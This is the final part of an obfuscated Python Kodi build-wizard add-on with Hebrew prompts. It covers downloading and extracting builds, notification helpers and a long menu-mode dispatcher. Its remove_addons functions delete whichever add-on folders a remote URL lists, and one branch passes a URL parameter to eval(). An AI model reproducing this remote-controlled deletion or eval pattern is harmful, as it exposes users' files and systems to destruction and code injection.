        OO0OOOO0OOO0O0O0O =urllib2 .Request (O00OOOOO0000OOO0O )#line:6469
        OOO00OO000000O0O0 =urllib2 .urlopen (OO0OOOO0OOO0O0O0O )#line:6470
        OOOO0O0OO0O000000 =xbmcgui .DialogProgress ()#line:6472
        OOOO0O0OO0O000000 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6473
        OOOO0O0OO0O000000 .update (0 )#line:6474
        O0OOOO000OOOO0000 =open (OOO0O0OO00O00OOOO ,'wb')#line:6476
        try :#line:6478
          O00OO00OO0OO00OOO =OOO00OO000000O0O0 .info ().getheader ('Content-Length').strip ()#line:6479
          OOO0O00OOOO0O00OO =True #line:6480
        except AttributeError :#line:6481
              OOO0O00OOOO0O00OO =False #line:6482
        if OOO0O00OOOO0O00OO :#line:6484
              O00OO00OO0OO00OOO =int (O00OO00OO0OO00OOO )#line:6485
        O00O000OO0OOOO0OO =0 #line:6487
        OOO00O00O0OOO00OO =time .time ()#line:6488
        while True :#line:6489
              O0O00O0OOOO0OOOO0 =OOO00OO000000O0O0 .read (8192 )#line:6490
              if not O0O00O0OOOO0OOOO0 :#line:6491
                  sys .stdout .write ('\n')#line:6492
                  break #line:6493
              O00O000OO0OOOO0OO +=len (O0O00O0OOOO0OOOO0 )#line:6495
              O0OOOO000OOOO0000 .write (O0O00O0OOOO0OOOO0 )#line:6496
              if not OOO0O00OOOO0O00OO :#line:6498
                  O00OO00OO0OO00OOO =O00O000OO0OOOO0OO #line:6499
              if OOOO0O0OO0O000000 .iscanceled ():#line:6500
                 OOOO0O0OO0O000000 .close ()#line:6501
                 try :#line:6502
                  os .remove (OOO0O0OO00O00OOOO )#line:6503
                 except :#line:6504
                  pass #line:6505
                 break #line:6506
              OOOO0O00O000O0O00 =float (O00O000OO0OOOO0OO )/O00OO00OO0OO00OOO #line:6507
              OOOO0O00O000O0O00 =round (OOOO0O00O000O0O00 *100 ,2 )#line:6508
              OOOO0OOOO0O0OOO00 =O00O000OO0OOOO0OO /(1024 *1024 )#line:6509
              O00OO000O0O0OO000 =O00OO00OO0OO00OOO /(1024 *1024 )#line:6510
              OOOO00000OO00O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0OOOO0O0OOO00 ,'teal',O00OO000O0O0OO000 )#line:6511
              if (time .time ()-OOO00O00O0OOO00OO )>0 :#line:6512
                O0OOOO0OOO00000O0 =O00O000OO0OOOO0OO /(time .time ()-OOO00O00O0OOO00OO )#line:6513
                O0OOOO0OOO00000O0 =O0OOOO0OOO00000O0 /1024 #line:6514
              else :#line:6515
               O0OOOO0OOO00000O0 =0 #line:6516
              OO0O0000O0OOO0O00 ='KB'#line:6517
              if O0OOOO0OOO00000O0 >=1024 :#line:6518
                 O0OOOO0OOO00000O0 =O0OOOO0OOO00000O0 /1024 #line:6519
                 OO0O0000O0OOO0O00 ='MB'#line:6520
              if O0OOOO0OOO00000O0 >0 and not OOOO0O00O000O0O00 ==100 :#line:6521
                  O0O0OOO00O0000O0O =(O00OO00OO0OO00OOO -O00O000OO0OOOO0OO )/O0OOOO0OOO00000O0 #line:6522
              else :#line:6523
                  O0O0OOO00O0000O0O =0 #line:6524
              O0OOOO0OO0OO0O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OOO00000O0 ,OO0O0000O0OOO0O00 )#line:6525
              OOOO0O0OO0O000000 .update (int (OOOO0O00O000O0O00 ),OOOO00000OO00O00O ,O0OOOO0OO0OO0O000 +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6527
        OOO0OO00OO0O00OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6530
        O0OOOO000OOOO0000 .close ()#line:6533
        extract .all (OOO0O0OO00O00OOOO ,OOO0OO00OO0O00OO0 ,OOOO0O0OO0O000000 )#line:6534
        try :#line:6538
          os .remove (OOO0O0OO00O00OOOO )#line:6539
        except :#line:6540
          pass #line:6541
def testnotify ():#line:6544
	OOO0O0OOO000O00O0 =wiz .workingURL (NOTIFICATION )#line:6545
	if OOO0O0OOO000O00O0 ==True :#line:6546
		try :#line:6547
			OO000000O0O0O0O0O ,O00O0OO00O000OOO0 =wiz .splitNotify (NOTIFICATION )#line:6548
			if OO000000O0O0O0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6549
			if STARTP2 ()=='ok':#line:6550
				notify .notification (O00O0OO00O000OOO0 ,True )#line:6551
		except Exception as O0O00O0O000OOO00O :#line:6552
			wiz .log ("Error on Notifications Window: %s"%str (O0O00O0O000OOO00O ),xbmc .LOGERROR )#line:6553
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6554
def testnotify2 ():#line:6555
	O0O00O0O0OOOO0000 =wiz .workingURL (NOTIFICATION2 )#line:6556
	if O0O00O0O0OOOO0000 ==True :#line:6557
		try :#line:6558
			O0OO00O00000O000O ,O00O00000O0O000O0 =wiz .splitNotify (NOTIFICATION2 )#line:6559
			if O0OO00O00000O000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6560
			if STARTP2 ()=='ok':#line:6561
				notify .notification2 (O00O00000O0O000O0 ,True )#line:6562
		except Exception as O0O0O00O000OO0O00 :#line:6563
			wiz .log ("Error on Notifications Window: %s"%str (O0O0O00O000OO0O00 ),xbmc .LOGERROR )#line:6564
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6565
def testnotify3 ():#line:6566
	OO00O00O0OO0O0OO0 =wiz .workingURL (NOTIFICATION3 )#line:6567
	if OO00O00O0OO0O0OO0 ==True :#line:6568
		try :#line:6569
			OOO0OOOO0000OOO00 ,OO00O0OO00O00O00O =wiz .splitNotify (NOTIFICATION3 )#line:6570
			if OOO0OOOO0000OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6571
			if STARTP2 ()=='ok':#line:6572
				notify .notification3 (OO00O0OO00O00O00O ,True )#line:6573
		except Exception as O00OOO000OO0O0O00 :#line:6574
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO000OO0O0O00 ),xbmc .LOGERROR )#line:6575
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6576
def wait ():#line:6577
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6578
def infobuild ():#line:6579
	OOOO00OO0OO000OO0 =wiz .workingURL (NOTIFICATION )#line:6580
	if OOOO00OO0OO000OO0 ==True :#line:6581
		try :#line:6582
			OO0OO0000OO00000O ,O00O0OOOO00000000 =wiz .splitNotify (NOTIFICATION )#line:6583
			if OO0OO0000OO00000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6584
			if STARTP2 ()=='ok':#line:6585
				notify .updateinfo (O00O0OOOO00000000 ,True )#line:6586
		except Exception as O0OO0O00OOO00OO00 :#line:6587
			wiz .log ("Error on Notifications Window: %s"%str (O0OO0O00OOO00OO00 ),xbmc .LOGERROR )#line:6588
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6589
def servicemanual ():#line:6590
	OO00O00O00000OO0O =wiz .workingURL (HELPINFO )#line:6591
	if OO00O00O00000OO0O ==True :#line:6592
		try :#line:6593
			O0OO0OOOO00OO0OOO ,OOO0OO0O00OOOO00O =wiz .splitNotify (HELPINFO )#line:6594
			if O0OO0OOOO00OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6595
			notify .helpinfo (OOO0OO0O00OOOO00O ,True )#line:6596
		except Exception as OOOOO0O00O0O0000O :#line:6597
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0O00O0O0000O ),xbmc .LOGERROR )#line:6598
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6599
def testupdate ():#line:6601
	if BUILDNAME =="":#line:6602
		notify .updateWindow ()#line:6603
	else :#line:6604
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6605
def testfirst ():#line:6607
	notify .firstRun ()#line:6608
def testfirstRun ():#line:6610
	notify .firstRunSettings ()#line:6611
def fastinstall ():#line:6614
	notify .firstRuninstall ()#line:6615
def addDir (O000OOOOO00OOO000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6622
	OOOOO0000O00O0OO0 =sys .argv [0 ]#line:6623
	if not mode ==None :OOOOO0000O00O0OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6624
	if not name ==None :OOOOO0000O00O0OO0 +="&name="+urllib .quote_plus (name )#line:6625
	if not url ==None :OOOOO0000O00O0OO0 +="&url="+urllib .quote_plus (url )#line:6626
	OO0000O000OOOO0O0 =True #line:6627
	if themeit :O000OOOOO00OOO000 =themeit %O000OOOOO00OOO000 #line:6628
	OO000O0OO0O0OO0OO =xbmcgui .ListItem (O000OOOOO00OOO000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6629
	OO000O0OO0O0OO0OO .setInfo (type ="Video",infoLabels ={"Title":O000OOOOO00OOO000 ,"Plot":description })#line:6630
	OO000O0OO0O0OO0OO .setProperty ("Fanart_Image",fanart )#line:6631
	if not menu ==None :OO000O0OO0O0OO0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6632
	OO0000O000OOOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOO0000O00O0OO0 ,listitem =OO000O0OO0O0OO0OO ,isFolder =True )#line:6633
	return OO0000O000OOOO0O0 #line:6634
def addFile (O000OO00OO0O00000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6636
	OOO0O0O0O000OOO0O =sys .argv [0 ]#line:6637
	if not mode ==None :OOO0O0O0O000OOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:6638
	if not name ==None :OOO0O0O0O000OOO0O +="&name="+urllib .quote_plus (name )#line:6639
	if not url ==None :OOO0O0O0O000OOO0O +="&url="+urllib .quote_plus (url )#line:6640
	OO00OO0O00O0OOOO0 =True #line:6641
	if themeit :O000OO00OO0O00000 =themeit %O000OO00OO0O00000 #line:6642
	OOOO0O00O00OO000O =xbmcgui .ListItem (O000OO00OO0O00000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6643
	OOOO0O00O00OO000O .setInfo (type ="Video",infoLabels ={"Title":O000OO00OO0O00000 ,"Plot":description })#line:6644
	OOOO0O00O00OO000O .setProperty ("Fanart_Image",fanart )#line:6645
	if not menu ==None :OOOO0O00O00OO000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6646
	OO00OO0O00O0OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O0O0O000OOO0O ,listitem =OOOO0O00O00OO000O ,isFolder =False )#line:6647
	return OO00OO0O00O0OOOO0 #line:6648
def get_params ():#line:6650
	O0O00O00O0O0OO0O0 =[]#line:6651
	O00000O0O0OO000OO =sys .argv [2 ]#line:6652
	if len (O00000O0O0OO000OO )>=2 :#line:6653
		OOO00O00OO000O0O0 =sys .argv [2 ]#line:6654
		OO0000O0OO000OOO0 =OOO00O00OO000O0O0 .replace ('?','')#line:6655
		if (OOO00O00OO000O0O0 [len (OOO00O00OO000O0O0 )-1 ]=='/'):#line:6656
			OOO00O00OO000O0O0 =OOO00O00OO000O0O0 [0 :len (OOO00O00OO000O0O0 )-2 ]#line:6657
		OOOO0OO0OO000OO00 =OO0000O0OO000OOO0 .split ('&')#line:6658
		O0O00O00O0O0OO0O0 ={}#line:6659
		for OOOOO0O000OO0O0O0 in range (len (OOOO0OO0OO000OO00 )):#line:6660
			OOO00O0OOO0OO0OO0 ={}#line:6661
			OOO00O0OOO0OO0OO0 =OOOO0OO0OO000OO00 [OOOOO0O000OO0O0O0 ].split ('=')#line:6662
			if (len (OOO00O0OOO0OO0OO0 ))==2 :#line:6663
				O0O00O00O0O0OO0O0 [OOO00O0OOO0OO0OO0 [0 ]]=OOO00O0OOO0OO0OO0 [1 ]#line:6664
		return O0O00O00O0O0OO0O0 #line:6666
def remove_addons ():#line:6668
	try :#line:6669
			import json #line:6670
			OOOOOO0OOO0O000O0 =urllib2 .urlopen (remove_url ).readlines ()#line:6671
			for OO000OO000OO0000O in OOOOOO0OOO0O000O0 :#line:6672
				O00O00OOOO00OOOOO =OO000OO000OO0000O .split (':')[1 ].strip ()#line:6674
				OO0000OO000000O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00O00OOOO00OOOOO ,'false')#line:6675
				O0OO00OOOO0000O00 =xbmc .executeJSONRPC (OO0000OO000000O00 )#line:6676
				O0OO00O0OOO0OO0OO =json .loads (O0OO00OOOO0000O00 )#line:6677
				OO00OO00O0O00O0O0 =os .path .join (addons_folder ,O00O00OOOO00OOOOO )#line:6679
				if os .path .exists (OO00OO00O0O00O0O0 ):#line:6681
					for OOO000O0O000OO000 ,OO0O0O00O00OO00OO ,O0OO0O0000O0OO0OO in os .walk (OO00OO00O0O00O0O0 ):#line:6682
						for O000OO000000OO0O0 in O0OO0O0000O0OO0OO :#line:6683
							os .unlink (os .path .join (OOO000O0O000OO000 ,O000OO000000OO0O0 ))#line:6684
						for OO0OO0O0OOO000OO0 in OO0O0O00O00OO00OO :#line:6685
							shutil .rmtree (os .path .join (OOO000O0O000OO000 ,OO0OO0O0OOO000OO0 ))#line:6686
					os .rmdir (OO00OO00O0O00O0O0 )#line:6687
			xbmc .executebuiltin ('Container.Refresh')#line:6689
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6690
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6691
	except :pass #line:6692
def remove_addons2 ():#line:6693
	try :#line:6694
			import json #line:6695
			OO000O0OO000OOO00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6696
			for O0OO0000000000O0O in OO000O0OO000OOO00 :#line:6697
				O0O000000OO00OOO0 =O0OO0000000000O0O .split (':')[1 ].strip ()#line:6699
				O0OOO0OO000OO0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0O000000OO00OOO0 ,'false')#line:6700
				O0OOO00OOOO0OOOO0 =xbmc .executeJSONRPC (O0OOO0OO000OO0OOO )#line:6701
				OO00O0O0OO0OOOO00 =json .loads (O0OOO00OOOO0OOOO0 )#line:6702
				O00O00OO0OO00OOOO =os .path .join (user_folder ,O0O000000OO00OOO0 )#line:6704
				if os .path .exists (O00O00OO0OO00OOOO ):#line:6706
					for O00O0OO0000OOO0OO ,O0OOOOO000O000OOO ,OO0O00O00OOO0O00O in os .walk (O00O00OO0OO00OOOO ):#line:6707
						for OO0O000OO0OOO0O00 in OO0O00O00OOO0O00O :#line:6708
							os .unlink (os .path .join (O00O0OO0000OOO0OO ,OO0O000OO0OOO0O00 ))#line:6709
						for O00O00OO000OO0O00 in O0OOOOO000O000OOO :#line:6710
							shutil .rmtree (os .path .join (O00O0OO0000OOO0OO ,O00O00OO000OO0O00 ))#line:6711
					os .rmdir (O00O00OO0OO00OOOO )#line:6712
	except :pass #line:6714
params =get_params ()#line:6715
url =None #line:6716
name =None #line:6717
mode =None #line:6718
try :mode =urllib .unquote_plus (params ["mode"])#line:6720
except :pass #line:6721
try :name =urllib .unquote_plus (params ["name"])#line:6722
except :pass #line:6723
try :url =urllib .unquote_plus (params ["url"])#line:6724
except :pass #line:6725
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6726
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6728
        file .write (str ('Done'))#line:6730
        file .close ()#line:6731
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6732
        xbmc .sleep (2000 )#line:6733
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6734
        ADDON .setSetting ('systemtype',label )#line:6735
def setView (OOO0O0OOO00OO000O ,O0O00O0OOO0O0OO00 ):#line:6737
	if wiz .getS ('auto-view')=='true':#line:6738
		OOOO000OOO0000OO0 =wiz .getS (O0O00O0OOO0O0OO00 )#line:6739
		if OOOO000OOO0000OO0 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO000OOO0000OO0 ='55'#line:6740
		if OOOO000OOO0000OO0 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO000OOO0000OO0 ='50'#line:6741
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO000OOO0000OO0 )#line:6742
if mode ==None :index ()#line:6744
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6746
elif mode =='builds':buildMenu ()#line:6747
elif mode =='viewbuild':viewBuild (name )#line:6748
elif mode =='buildinfo':buildInfo (name )#line:6749
elif mode =='buildpreview':buildVideo (name )#line:6750
elif mode =='install':buildWizard (name ,url )#line:6751
elif mode =='theme':buildWizard (name ,mode ,url )#line:6752
elif mode =='viewthirdparty':viewThirdList (name )#line:6753
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6754
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6755
elif mode =='maint':maintMenu (name )#line:6757
elif mode =='passpin':passandpin ()#line:6758
elif mode =='backmyupbuild':backmyupbuild ()#line:6759
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6760
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6761
elif mode =='advancedsetting':advancedWindow (name )#line:6762
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6763
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6764
elif mode =='asciicheck':wiz .asciiCheck ()#line:6765
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6766
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6767
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6768
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6769
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6770
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6771
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6772
elif mode =='currentsettings':viewAdvanced ()#line:6773
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6774
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6775
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6776
elif mode =='fixskin':backtokodi ()#line:6777
elif mode =='testcommand':testcommand ()#line:6778
elif mode =='logsend':logsend ()#line:6779
elif mode =='rdon':rdon ()#line:6780
elif mode =='rdoff':rdoff ()#line:6781
elif mode =='setrd':setrealdebrid ()#line:6782
elif mode =='setrd2':setautorealdebrid ()#line:6783
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6784
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6785
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6786
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6787
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6788
elif mode =='freshstart':freshStart ()#line:6789
elif mode =='forceupdate':wiz .forceUpdate ()#line:6790
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6791
elif mode =='forceclose':wiz .killxbmc ()#line:6792
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6793
elif mode =='hidepassword':wiz .hidePassword ()#line:6794
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6795
elif mode =='enableaddons':enableAddons ()#line:6796
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6797
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6798
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6799
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6800
elif mode =='uploadlog':uploadLog .Main ()#line:6801
elif mode =='viewlog':LogViewer ()#line:6802
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6803
elif mode =='viewerrorlog':errorChecking (all =True )#line:6804
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6805
elif mode =='purgedb':purgeDb ()#line:6806
elif mode =='fixaddonupdate':fixUpdate ()#line:6807
elif mode =='removeaddons':removeAddonMenu ()#line:6808
elif mode =='removeaddon':removeAddon (name )#line:6809
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6810
elif mode =='removedata':removeAddonData (name )#line:6811
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6812
elif mode =='systeminfo':systemInfo ()#line:6813
elif mode =='restorezip':restoreit ('build')#line:6814
elif mode =='restoregui':restoreit ('gui')#line:6815
elif mode =='restoreaddon':restoreit ('addondata')#line:6816
elif mode =='restoreextzip':restoreextit ('build')#line:6817
elif mode =='restoreextgui':restoreextit ('gui')#line:6818
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6819
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6820
elif mode =='traktsync':traktsync ()#line:6821
elif mode =='apk':apkMenu (name )#line:6823
elif mode =='apkscrape':apkScraper (name )#line:6824
elif mode =='apkinstall':apkInstaller (name ,url )#line:6825
elif mode =='speed':speedMenu ()#line:6826
elif mode =='net':net_tools ()#line:6827
elif mode =='GetList':GetList (url )#line:6828
elif mode =='youtube':youtubeMenu (name )#line:6829
elif mode =='viewVideo':playVideo (url )#line:6830
elif mode =='addons':addonMenu (name )#line:6832
elif mode =='addoninstall':addonInstaller (name ,url )#line:6833
elif mode =='savedata':saveMenu ()#line:6835
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6836
elif mode =='managedata':manageSaveData (name )#line:6837
elif mode =='whitelist':wiz .whiteList (name )#line:6838
elif mode =='trakt':traktMenu ()#line:6840
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6841
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6842
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6843
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6844
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6845
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6846
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6847
elif mode =='realdebrid':realMenu ()#line:6849
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6850
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6851
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6852
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6853
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6854
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6855
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6856
elif mode =='login':loginMenu ()#line:6858
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6859
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6860
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6861
elif mode =='clearlogin':loginit .clearSaved (name )#line:6862
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6863
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6864
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6865
elif mode =='contact':notify .contact (CONTACT )#line:6867
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6868
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6869
elif mode =='developer':developer ()#line:6871
elif mode =='converttext':wiz .convertText ()#line:6872
elif mode =='createqr':wiz .createQR ()#line:6873
elif mode =='testnotify':testnotify ()#line:6874
elif mode =='testnotify2':testnotify2 ()#line:6875
elif mode =='servicemanual':servicemanual ()#line:6876
elif mode =='fastinstall':fastinstall ()#line:6877
elif mode =='testupdate':testupdate ()#line:6878
elif mode =='testfirst':testfirst ()#line:6879
elif mode =='testfirstrun':testfirstRun ()#line:6880
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6881
elif mode =='bg':wiz .bg_install (name ,url )#line:6883
elif mode =='bgcustom':wiz .bg_custom ()#line:6884
elif mode =='bgremove':wiz .bg_remove ()#line:6885
elif mode =='bgdefault':wiz .bg_default ()#line:6886
elif mode =='rdset':rdsetup ()#line:6887
elif mode =='mor':morsetup ()#line:6888
elif mode =='mor2':morsetup2 ()#line:6889
elif mode =='resolveurl':resolveurlsetup ()#line:6890
elif mode =='urlresolver':urlresolversetup ()#line:6891
elif mode =='forcefastupdate':forcefastupdate ()#line:6892
elif mode =='traktset':traktsetup ()#line:6893
elif mode =='placentaset':placentasetup ()#line:6894
elif mode =='flixnetset':flixnetsetup ()#line:6895
elif mode =='reptiliaset':reptiliasetup ()#line:6896
elif mode =='yodasset':yodasetup ()#line:6897
elif mode =='numbersset':numberssetup ()#line:6898
elif mode =='uranusset':uranussetup ()#line:6899
elif mode =='genesisset':genesissetup ()#line:6900
elif mode =='fastupdate':fastupdate ()#line:6901
elif mode =='folderback':folderback ()#line:6902
elif mode =='menudata':Menu ()#line:6903
elif mode =='infoupdate':infobuild ()#line:6904
elif mode =='wait':wait ()#line:6905
elif mode ==2 :#line:6906
        wiz .torent_menu ()#line:6907
elif mode ==3 :#line:6908
        wiz .popcorn_menu ()#line:6909
elif mode ==8 :#line:6910
        wiz .metaliq_fix ()#line:6911
elif mode ==9 :#line:6912
        wiz .quasar_menu ()#line:6913
elif mode ==5 :#line:6914
        swapSkins ('skin.Premium.mod')#line:6915
elif mode ==13 :#line:6916
        wiz .elementum_menu ()#line:6917
elif mode ==16 :#line:6918
        wiz .fix_wizard ()#line:6919
elif mode ==17 :#line:6920
        wiz .last_play ()#line:6921
elif mode ==18 :#line:6922
        wiz .normal_metalliq ()#line:6923
elif mode ==19 :#line:6924
        wiz .fast_metalliq ()#line:6925
elif mode ==20 :#line:6926
        wiz .fix_buffer2 ()#line:6927
elif mode ==21 :#line:6928
        wiz .fix_buffer3 ()#line:6929
elif mode ==11 :#line:6930
        wiz .fix_buffer ()#line:6931
elif mode ==15 :#line:6932
        wiz .fix_font ()#line:6933
elif mode ==14 :#line:6934
        wiz .clean_pass ()#line:6935
elif mode ==22 :#line:6936
        wiz .movie_update ()#line:6937
elif mode =='simpleiptv':#line:6940
    DIALOG =xbmcgui .Dialog ()#line:6942
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6943
    if choice ==1 :#line:6944
        iptvkodi17_18 ()#line:6945
    else :#line:6947
     sys .exit ()#line:6948
elif mode =='simpleidanplus':#line:6950
    DIALOG =xbmcgui .Dialog ()#line:6951
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6952
    if choice ==1 :#line:6953
        iptvidanplus ()#line:6954
    else :#line:6956
     sys .exit ()#line:6957
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6959
elif mode =='adv_settings':buffer1 ()#line:6960
elif mode =='getpass':getpass ()#line:6961
elif mode =='setpass':setpass ()#line:6962
elif mode =='setuname':setuname ()#line:6963
elif mode =='passandUsername':passandUsername ()#line:6964
elif mode =='9':disply_hwr ()#line:6965
elif mode =='99':disply_hwr2 ()#line:6966
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))